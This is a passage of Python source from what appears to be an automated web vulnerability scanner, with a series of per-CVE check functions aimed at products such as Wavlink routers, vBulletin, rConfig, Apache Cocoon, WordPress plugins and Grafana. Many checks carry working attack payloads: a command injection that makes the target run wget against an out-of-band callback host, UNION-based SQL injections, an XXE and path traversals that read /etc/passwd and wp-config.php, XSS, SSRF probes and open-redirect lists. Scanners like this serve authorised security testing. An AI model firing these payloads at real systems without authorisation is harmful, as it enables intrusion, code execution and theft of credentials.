  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/kylin/api/admin/config']
  redirAllow = False
  statusF = 200
  textF = 'kylin.metadata.url'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'config' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-13927
def attMOD208(progScope):
  myKey = "3e1c57cd8177d3e50877c300b2dfbbbb"
  vulnCat = "Exposure"
  vulnName = "CVE-2020-13927"
  severity = "P1"
  vulnDsc = "Unauthenticated Airflow Experimental REST API"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/api/experimental/latest_runs']
  redirAllow = False
  statusF = 200
  textF = '"dag_run_url":'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and '"dag_id":' in z.text and '"items":' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-13700
def attMOD209(progScope):
  myKey = "9cc106a83db414d865421135aa8be4ab"
  vulnCat = "IDOR"
  vulnName = "CVE-2020-13700"
  severity = "P2"
  vulnDsc = "acf-to-rest-api wordpress plugin IDOR"
  vulnPath = ""
  fullPayload = ""
  customHeaders = {'Content-Type': 'application/json'}
  reqMethod = ""
  postData = ""
  urlList = ['/wp-json/acf/v3/options/a?id=active&field=plugins']
  redirAllow = False
  statusF = 200
  textF = 'acf-to-rest-api\/class-acf-to-rest-api.php'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-13117
def attMOD210(progScope):
  myKey = "2b4e6c28836f858b29085bf0d747580c"
  vulnCat = "RCE"
  vulnName = "CVE-2020-13117"
  severity = "P1"
  vulnDsc = "Wavlink Multiple AP - Unauthenticated RCE"
  vulnPath = ""
  fullPayload = ""
  customHeaders = {'Content-Type': 'application/x-www-form-urlencoded'
        ,'Accept-Encoding': 'gzip, deflate'}
  reqMethod = "POST"
  postData = """newUI=1&page=login&username=admin&langChange=0&ipaddr=192.168.1.66&login_page=login.shtml&homepage=main.shtml&sysinitpage=sysinit.shtml&hostname=wifi.wavlink.com&key=%27%3B%60wget+http%3A%2F%2F0000nlm6c0j53v2s668g61398133715me.interact.sh/%3B%60%3B%23&password=asd&lang_select=en"""
  urlList = ['/cgi-bin/login.cgi']
  redirAllow = False
  statusF = 200
  textF = 'em51733189316g866s2v35j0c6mln0000'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-12720
def attMOD211(progScope):
  myKey = "d28907eb039524b33f40e6bcd62893ef"
  vulnCat = "SQLi"
  vulnName = "CVE-2020-12720"
  severity = "P1"
  vulnDsc = "CVE-2020-12720 vBulletin SQLI"
  vulnPath = ""
  fullPayload = ""
  customHeaders = {'X-Requested-With': 'XMLHttpRequest'
        ,'Accept': '*/*'
        ,'Content-Type': 'application/x-www-form-urlencoded'}
  reqMethod = "POST"
  postData = """nodeId%5Bnodeid%5D=1%20union%20select%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2CCONCAT%28%27vbulletin%27%2C%27rce%27%2C%40%40version%29%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27--+-"""
  urlList = ['/ajax/api/content_infraction/getIndexableContent']
  redirAllow = False
  statusF = 200
  textF = 'vbulletinrce'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-12054
def attMOD212(progScope):
  myKey = "35d89fba5462ebee45c1546ec78d20ca"
  vulnCat = "RXSS"
  vulnName = "CVE-2020-12054"
  severity = "P3"
  vulnDsc = "Catch Breadcrumb < 1.5.7 - Unauthenticated Reflected XSS"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/?s=%3Cimg%20src%3Dx%20onerror%3Dalert%28123%29%3B%3E']
  redirAllow = False
  statusF = 200
  textF = '<img src=x onerror=alert(123);>'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-11991
def attMOD213(progScope):
  myKey = "a75d95bbf67ad94f2f14dc42a853f856"
  vulnCat = "XMLi"
  vulnName = "CVE-2020-11991"
  severity = "P2"
  vulnDsc = "Apache Cocoon 2.1.12 XML Injection"
  vulnPath = ""
  fullPayload = ""
  customHeaders = {'Content-Type': 'text/xml'}
  reqMethod = "POST"
  postData = """<!--?xml version="1.0" ?-->
      <!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
      <userInfo>
      <firstName>John</firstName>
      <lastName>&ent;</lastName>
      </userInfo>"""
  urlList = ['/v2/api/product/manger/getInfo']
  redirAllow = False
  statusF = 200
  textF = 'root:x:0:0:'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-11930
def attMOD214(progScope):
  myKey = "2090fb24afa5b1fdfe7e2b726a198858"
  vulnCat = "RXSS"
  vulnName = "CVE-2020-11930"
  severity = "P3"
  vulnDsc = "WordPress Plugin \"Translate WordPress with GTranslate\" (gtranslate) XSS"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/does_not_exist"%22%3E%3Cscript%3Ealert("XSS")%3C/script%3E<img%20src=x']
  redirAllow = False
  statusF = 200
  textF = '<script>alert("XSS")</script>'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-11738
def attMOD215(progScope):
  myKey = "4dc3b852db133099d28fdb1045e37f1d"
  vulnCat = "Traversal"
  vulnName = "CVE-2020-11738"
  severity = "P2"
  vulnDsc = "WordPress Duplicator plugin Directory Traversal"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-admin/admin-ajax.php?action=duplicator_download&file=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd','/wp-admin/admin-ajax.php?action=duplicator_download&file=%2F..%2Fwp-config.php']
  redirAllow = False
  statusF = 200
  textF = 'DB_NAME'
  condition = lambda z : True if( (z.status_code == statusF) and ((textF in z.text and 'DB_USER' in z.text and 'DB_PASSWORD' in z.text and 'DB_HOST' in z.text and 'DB_CHARSET' in z.text) or ('root:x:0:0:' in z.text) )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-11110
def attMOD216(progScope):
  myKey = "f000a2bf82ab34aa845acf5cb3a06428"
  vulnCat = "SXSS"
  vulnName = "CVE-2020-11110"
  severity = "P3"
  vulnDsc = "Grafana Unauthenticated Stored XSS"
  vulnPath = ""
  fullPayload = ""
  customHeaders = {'Accept': 'application/json, text/plain, */*'
        ,'Accept-Language': 'en-US,en;q=0.5'
        ,'content-type': 'application/json'
        ,'Connection': 'close'}
  reqMethod = "POST"
  postData = """{"dashboard":{"annotations":{"list":[{"name":"Annotations & Alerts","enable":true,"iconColor":"rgba(0, 211, 255, 1)","type":"dashboard","builtIn":1,"hide":true}]},"editable":true,"gnetId":null,"graphTooltip":0,"id":null,"links":[],"panels":[],"schemaVersion":18,"snapshot":{"originalUrl":"javascript:alert('Revers3c')","timestamp":"2020-03-30T01:24:44.529Z"},"style":"dark","tags":[],"templating":{"list":[]},"time":{"from":null,"to":"2020-03-30T01:24:53.549Z","raw":{"from":"6h","to":"now"}},"timepicker":{"refresh_intervals":["5s","10s","30s","1m","5m","15m","30m","1h","2h","1d"],"time_options":["5m","15m","1h","6h","12h","24h","2d","7d","30d"]},"timezone":"","title":"Dashboard","uid":null,"version":0},"name":"Dashboard","expires":0}"""
  urlList = ['/api/snapshots']
  redirAllow = False
  statusF = 200
  textF = '"deleteKey":'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and '"deleteUrl":' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-11034
def attMOD217(progScope):
  myKey = "d3caeedaf9dfd33b6a4dd1e8f4d6638d"
  vulnCat = "OpenRedirect"
  vulnName = "CVE-2020-11034"
  severity = "P3"
  vulnDsc = "GLPI v.9.4.6 - Open redirect"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/index.php?redirect=/\/iput.local/','/index.php?redirect=//iput.local']
  redirAllow = False
  # statusF = 200
  textF = 'iput.local'
  condition = lambda z : True if( (textF == z.headers['Location'] )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-10549
def attMOD218(progScope):
  myKey = "3e91a68c9a7ca105f75997ed5f04abee"
  vulnCat = "SQLi"
  vulnName = "CVE-2020-10549"
  severity = "P1"
  vulnDsc = "rConfig 3.9.4 SQLi"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ["/snippets.inc.php?search=True&searchField=antani'+union+select+(select+concat(0x223e3c42523e5b70726f6a6563742d646973636f766572795d)+limit+0,1),NULL,NULL,NULL+--+&searchColumn=snippetName&searchOption=contains"]
  redirAllow = False
  statusF = 200
  textF = '[project-discovery]'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-10548
def attMOD219(progScope):
  myKey = "796117f5f9d71bacdebbc94afce5a232"
  vulnCat = "SQLi"
  vulnName = "CVE-2020-10548"
  severity = "P1"
  vulnDsc = "rConfig 3.9.4 SQLi"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ["/devices.inc.php?search=True&searchField=antani'+union+select+(select+concat(0x223e3c42523e5b70726f6a6563742d646973636f766572795d)+limit+0,1),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL+--+&searchColumn=n.id&searchOption=contains"]
  redirAllow = False
  statusF = 200
  textF = '[project-discovery]'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-10547
def attMOD220(progScope):
  myKey = "4c1377b99cacf905b065ec3d5550a991"
  vulnCat = "SQLi"
  vulnName = "CVE-2020-10547"
  severity = "P1"
  vulnDsc = "rConfig 3.9.4 SQLi"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ["/compliancepolicyelements.inc.php?search=True&searchField=antani'+union+select+(select+concat(0x223e3c42523e5b70726f6a6563742d646973636f766572795d)+limit+0,1),NULL,NULL,NULL,NULL+--+&searchColumn=elementName&searchOption=contains"]
  redirAllow = False
  statusF = 200
  textF = '[project-discovery]'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-10148
def attMOD221(progScope):
  myKey = "c2b34056aea3c161c899e88479d53b7f"
  vulnCat = "RCE"
  vulnName = "CVE-2020-10148"
  severity = "P1"
  vulnDsc = "SolarWinds Orion API Auth Bypass Leads to RCE (SUPERNOVA)"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/web.config.i18n.ashx?l=nuclei&v=nuclei']
  redirAllow = False
  statusF = 200
  textF = 'SolarWinds.Orion.Core.'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2020-0618
def attMOD222(progScope):
  myKey = "476b54befa1e6cf202b7e7d86fcf55e5"
  vulnCat = "RCE"
  vulnName = "CVE-2020-0618"
  severity = "P2"
  vulnDsc = "RCE in SQL Server Reporting Services"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/ReportServer/Pages/ReportViewer.aspx']
  redirAllow = False
  statusF = 200
  textF = 'view report'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# aws-ecs-container-agent-tasks
def attMOD223(progScope):
  myKey = "d1a93ac1865b38fa3c12a0f9918e6d20"
  vulnCat = "Exposure"
  vulnName = "aws-ecs-container-agent-tasks"
  severity = "P4"
  vulnDsc = "Aws container metadata content"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/v1/metadata','/v1/tasks']
  redirAllow = False
  statusF = 200
  textF = 'arn:aws:ecs'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# htaccess-config
def attMOD224(progScope):
  myKey = "458172a69b0ecdbe47c5984218b414d8"
  vulnCat = "Disclosure"
  vulnName = "htaccess-config"
  severity = "P5"
  vulnDsc = "HTaccess config file"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/.htaccess']
  redirAllow = False
  statusF = 200
  textF = '</IfModule>'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and '<IfModule' in z.text and 'RewriteRule' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# joomla-htaccess-file
def attMOD225(progScope):
  myKey = "a0b655fa5bf875484a3f4c000ea2fb7c"
  vulnCat = "Exposure"
  vulnName = "joomla-htaccess-file"
  severity = "P4"
  vulnDsc = "Joomla htaccess file disclosure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/htaccess.txt']
  redirAllow = False
  statusF = 200
  textF = '# @package    Joomla'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'Open Source Matters. All rights reserved' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# phpmyadmin-setup
def attMOD226(progScope):
  myKey = "423a0606da9f44a96176a7ff4f9f326b"
  vulnCat = "Exposure"
  vulnName = "phpmyadmin-setup"
  severity = "P3"
  vulnDsc = "Publicly Accessible Phpmyadmin Setup"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/phpmyadmin/scripts/setup.php','/_phpmyadmin/scripts/setup.php','/forum/phpmyadmin/scripts/setup.php','/php/phpmyadmin/scripts/setup.php','/typo3/phpmyadmin/scripts/setup.php','/web/phpmyadmin/scripts/setup.php','/xampp/phpmyadmin/scripts/setup.php','/sysadmin/phpMyAdmin/scripts/setup.php']
  redirAllow = False
  statusF = 200
  textF = 'You want to configure phpMyAdmin using web interface'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# symfony-debugmode
def attMOD227(progScope):
  myKey = "c32722588b2d9a8d28c77ceb2b580b14"
  vulnCat = "Disclosure"
  vulnName = "symfony-debugmode"
  severity = "P2"
  vulnDsc = "Symfony Debug Mode"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/']
  redirAllow = False
  statusF = 200
  textF = 'debug mode</a> is enabled.'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'http' in z.headers['X-Debug-Token-Link'] )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# django-debug
def attMOD228(progScope):
  myKey = "0a009e832b620df55d5684e846c0b9dd"
  vulnCat = "Exposures"
  vulnName = "django-debug"
  severity = "P3"
  vulnDsc = "Django Debug Method Enabled"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/NON_EXISTING_PATH/']
  redirAllow = False
  statusF = 404
  textF = 'URLconf defined'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'Page not found' in z.text and 'Django tried these URL patterns, in this order' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# docker-registry
def attMOD229(progScope):
  myKey = "b0ec9e44e621f19af87ef808621c004d"
  vulnCat = "Exposures"
  vulnName = "docker-registry"
  severity = "P3"
  vulnDsc = "Docker Registry Listing"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/v2/_catalog']
  redirAllow = False
  statusF = 200
  textF = '"repositories":'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# top-xss-params
def attMOD230(progScope):
  myKey = "031eacbc5b02a5fd893e861210056d71"
  vulnCat = "RXSS"
  vulnName = "top-xss-params"
  severity = "P3"
  vulnDsc = "Top 15 XSS Parameter Check"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/?q=%27%3E%22%3Csvg%2Fonload=confirm%28%27iput%27%29%3E&s=%27%3E%22%3Csvg%2Fonload=confirm%28%27iput%27%29%3E&search=%27%3E%22%3Csvg%2Fonload=confirm%28%27iput%27%29%3E&id=%27%3E%22%3Csvg%2Fonload=confirm%28%27iput%27%29%3E&action=%27%3E%22%3Csvg%2Fonload=confirm%28%27iput%27%29%3E&keyword=%27%3E%22%3Csvg%2Fonload=confirm%28%27iput%27%29%3E&query=%27%3E%22%3Csvg%2Fonload=confirm%28%27iput%27%29%3E&page=%27%3E%22%3Csvg%2Fonload=confirm%28%27iput%27%29%3E&keywords=%27%3E%22%3Csvg%2Fonload=confirm%28%27iput%27%29%3E&url=%27%3E%22%3Csvg%2Fonload=confirm%28%27iput%27%29%3E&view=%27%3E%22%3Csvg%2Fonload=confirm%28%27iput%27%29%3E&cat=%27%3E%22%3Csvg%2Fonload=confirm%28%27iput%27%29%3E&name=%27%3E%22%3Csvg%2Fonload=confirm%28%27iput%27%29%3E&key=%27%3E%22%3Csvg%2Fonload=confirm%28%27iput%27%29%3E&p=%27%3E%22%3Csvg%2Fonload=confirm%28%27iput%27%29%3E']
  redirAllow = False
  statusF = 200
  textF = '\'>"<svg/onload=confirm(\'iput\')>'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text) and ('<title>Access Denied</title>' not in z.text and 'You don\'t have permission to access' not in z.text) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# FastLY_SPECIAL_TAKEOVER
def attMOD231(progScope):
  myKey = "233b312a9ca7a07184c1f3672621d331"
  vulnCat = "SubDomTakeOver"
  vulnName = "FASTLY_TAKEOVER"
  severity = "P2"
  vulnDsc = "In some cases fast takeover is possible"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/']
  redirAllow = False
  statusF = 500
  textF = '<title>Fastly error: unknown domain '
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'Please check that this domain has been added to a service.</p>' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# ANIMA_TAKEOVER
def attMOD232(progScope):
  myKey = "889e4cd2927b163293232bf787bdaee0"
  vulnCat = "SubTakeOver"
  vulnName = "ANIMA_TAKEOVER"
  severity = "P2"
  vulnDsc = "ANIMA CLOUD SUBDOMAIN TAKEOVER"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/']
  redirAllow = False
  # statusF = 200
  textF = 'If this is your website and you\'ve just created it, try refreshing in a minut'
  condition = lambda z : True if( (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# Worksites.net_TAKEOVER
def attMOD233(progScope):
  myKey = "ec8700c76f633d02ad8613e65a5a151f"
  vulnCat = "SubTakeOver"
  vulnName = "Worksites.net_TAKEOVER"
  severity = "P2"
  vulnDsc = "Worksites.net CLOUD SUBDOMAIN TAKEOVER"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/']
  redirAllow = False
  # statusF = 200
  textF = 'Hello! Sorry, but the website you&rsquo;re looking for doesn&rsquo;t exist.'
  condition = lambda z : True if( (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)
  
# Appery.io_TAKEOVER
def attMOD234(progScope):
  myKey = "7505ec742ad3537cf5d093973142a4b0"
  vulnCat = "SubTakeOver"
  vulnName = "Appery.io_TAKEOVER"
  severity = "P2"
  vulnDsc = "Appery.io_TAKEOVER"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/']
  redirAllow = False
  # statusF = 200
  textF = '<p>This page will be updated automatically when your app is published.</p>'
  condition = lambda z : True if( (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)
  
# xmlrpc-pingback-ssrf
def attMOD235(progScope):
  myKey = "1af9fec894495b01375423b6e70f3a28"
  vulnCat = "SSRF"
  vulnName = "xmlrpc-pingback-ssrf"
  severity = "P2"
  vulnDsc = "XMLRPC Pingback SSRF"
  vulnPath = ""
  fullPayload = ""
  customHeaders = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}
  reqMethod = "POST"
  postData = """<?xml version="1.0" encoding="UTF-8"?>
        <methodCall>
        <methodName>pingback.ping</methodName>
        <params>
        <param>
        <value>http://0000nlm6c0j53v2s668g61398133715me.interact.sh</value>
        </param>
        </params>
        </methodCall>"""
  urlList = ['/xmlrpc/pingback']
  redirAllow = False
  statusF = 200
  textF = 'em51733189316g866s2v35j0c6mln0000'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# request-based-interaction
def attMOD236(progScope):
  myKey = "ec5cd79a0dc42c463bcc069dda343ff2"
  vulnCat = "OOB-SSRF"
  vulnName = "request-based-interaction"
  severity = "P4"
  vulnDsc = "OOB Request Based Interaction"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['http://0000nlm6c0j53v2s668g61398133715me.interact.sh/','@0000nlm6c0j53v2s668g61398133715me.interact.sh/','0000nlm6c0j53v2s668g61398133715me.interact.sh:80/']
  redirAllow = False
  statusF = 200
  textF = 'em51733189316g866s2v35j0c6mln0000'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# request-based-interaction2
def attMOD237(progScope):
  myKey = "9416f152bf7e96f6e8e2b9189e91825d"
  vulnCat = "OOB-SSRF"
  vulnName = "request-based-interaction2"
  severity = "P4"
  vulnDsc = "OOB Request Based Interaction"
  vulnPath = ""
  fullPayload = ""
  customHeaders = {'Host':'0000nlm6c0j53v2s668g61398133715me.interact.sh'}
  reqMethod = ""
  postData = ""
  urlList = ['/']
  redirAllow = False
  statusF = 200
  textF = 'em51733189316g866s2v35j0c6mln0000'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)
  
# open-redirect
def attMOD238(progScope):
  myKey = "413a2f20e2fb7eeda5185cbe05f2e1b5"
  vulnCat = "OpenRedirect"
  vulnName = "open-redirect"
  severity = "P4"
  vulnDsc = "Open URL redirect detection"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/example.com/','/example.com//','///;@example.com','///example.com/%2F..','/////example.com','//example.com/%2F..','//example.com/..;/css','/example%E3%80%82com','/%5Cexample.com','/example.com','//example.com/','/%00/example.com/','/%09/example.com/','/%0a/example.com/','/%0d/example.com/','////example.com/%2f%2e%2e','/%5cexample.com/%2f%2e%2e','/{{BaseURL}}example.com','//{{BaseURL}}example.com/','////{{BaseURL}}example.com/%2f%2e%2e','/%5c{{BaseURL}}example.com/%2f%2e%2e','/?page=example.com&_url=example.com&callback=example.com&checkout_url=example.com&content=example.com&continue=example.com&continueTo=example.com&counturl=example.com&data=example.com&dest=example.com&dest_url=example.com&diexample.com&document=example.com&domain=example.com&done=example.com&download=example.com&feed=example.com&file=example.com&host=example.com&html=example.com&http=example.com&https=example.com&image=example.com&image_src=example.com&image_url=example.com&imageurl=example.com&include=example.com&langTo=example.com&media=example.com&navigation=example.com&next=example.com&open=example.com&out=example.com&page=example.com&page_url=example.com&pageurl=example.com&path=example.com&picture=example.com&port=example.com&proxy=example.com&redir=example.com&redirect=example.com&redirectUri=example.com&redirectUrl=example.com&reference=example.com&referrer=example.com&req=example.com&request=example.com&retUrl=example.com&return=example.com&returnTo=example.com&return_path=example.com&return_to=example.com&rurl=example.com&show=example.com&site=example.com&source=example.com&src=example.com&target=example.com&to=example.com&uri=example.com&url=example.com&val=example.com&validate=example.com&view=example.com&window=example.com&redirect_to=example.com&ret=example.com&r2=example.com&img=example.com&u=example.com&r=example.com&URL=example.com&AuthState=example.com','/1/_https@example.com']
  redirAllow = False
  statusF = 302
  textF = 'example.com'
  condition = lambda z : True if( (z.status_code == statusF or z.status_code == 301) and (textF == z.headers['Location'] )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# oob-param-based-interaction
def attMOD239(progScope):
  myKey = "4d7cc4161eade9a9e3b93eb5ee92f702"
  vulnCat = "OOB-SSRF"
  vulnName = "oob-param-based-interaction"
  severity = "P4"
  vulnDsc = "Parameter Based Generic OOB Interaction"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
